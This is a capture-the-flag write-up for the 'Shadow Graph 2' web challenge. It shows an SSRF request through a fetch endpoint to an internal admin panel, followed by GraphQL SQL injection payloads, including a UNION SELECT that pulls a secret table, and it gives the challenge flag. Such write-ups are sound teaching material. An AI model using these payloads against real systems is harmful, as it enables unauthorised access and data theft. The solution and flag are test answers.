---
title: "Ramadan's Spark CTF 2025 — Shadow Graph 2"
description: 'SSRF to GraphQL SQL injection'
pubDate: 'Mar 29 2025'
tags: ['ctf', 'web', 'ssrf', 'graphql', 'sqli']
thumbnail: 'https://miro.medium.com/v2/resize:fit:1100/1*b0NXQyQsCg6w_XDiJ-EuXA.png'
---

# Shadow Graph 2

<img src="https://miro.medium.com/v2/resize:fit:1100/1*b0NXQyQsCg6w_XDiJ-EuXA.png" alt="Shadow Graph 2 challenge" />

## Step 1: Identifying Key Information

While inspecting the source code, we find two important notes:

- From `/index.html`: `<!-- Oops!! Check internal/admin for testing -->`
- From `/dashboard`: `<!-- Note for admins only: Use the fetch utility for internal testing on port 4000 -->`

These hints suggest we need to access the **internal admin panel** via **SSRF**.

## Step 2: Exploiting SSRF

To access the internal admin panel, we exploit SSRF using the `fetch` utility:

```
https://shadow-two.espark.tn/fetch?url=http://localhost:4000/internal/admin
```

This escalates privileges and grants access as an **admin**.

## Step 3: GraphQL Enumeration

Now with admin access, we navigate to `/graphql` and explore queries:

```
getUser(username: String)
getAllProducts
getProductById(id: Int)
```

Test for SQL injection:

```graphql
{
  getUser(username: "admin' OR '1'='1") {
    id
    username
    role
  }
}
```

This confirms SQL injection in the `getUser` query.

## Step 4: Exploiting SQLi

Using SQL injection in `getProductById`:

```graphql
{
  getProductById(id: "-1 UNION SELECT 3, secret_info, 'description', 0 FROM product_secrets WHERE product_id = 3") {
    id
    name
    description
    price
  }
}
```

This retrieves the flag from the `product_secrets` table.

**Flag:** `Spark{s0_M4ny_w4yss_t0_w1N!!!}`
